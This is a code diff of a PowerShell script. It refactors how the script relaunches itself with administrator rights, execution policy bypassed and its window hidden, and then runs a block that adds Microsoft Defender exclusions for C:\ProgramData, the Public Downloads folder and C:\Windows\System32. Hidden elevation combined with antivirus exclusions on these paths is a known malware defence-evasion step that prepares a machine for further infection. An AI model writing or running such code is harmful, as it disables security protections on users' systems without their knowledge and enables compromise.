@@ -1,4 +1,14 @@
-$scriptblock = {
+function Run-ElevatedScript {
+    param(
+        [Parameter(Mandatory=$true)]
+        [ScriptBlock]
+        $ScriptBlock
+    )
+
+    Start-Process PowerShell -Verb runas -ArgumentList "-ExecutionPolicy Bypass", "-WindowStyle Hidden", $ScriptBlock
+}
+
+$scriptBlock = {
     Add-MpPreference -ExclusionPath 'C:\ProgramData'
     Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'
     Add-MpPreference -ExclusionPath 'C:\Windows\System32'
@@ -14,8 +24,7 @@ $scriptblock = {
 }
 
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process PowerShell -Verb runas -ArgumentList "-ExecutionPolicy Bypass", "-WindowStyle Hidden", $scriptblock
-    Exit
+    Run-ElevatedScript -ScriptBlock $scriptBlock
 } else {
-    Invoke-Expression $scriptblock
+    & $scriptBlock
 }
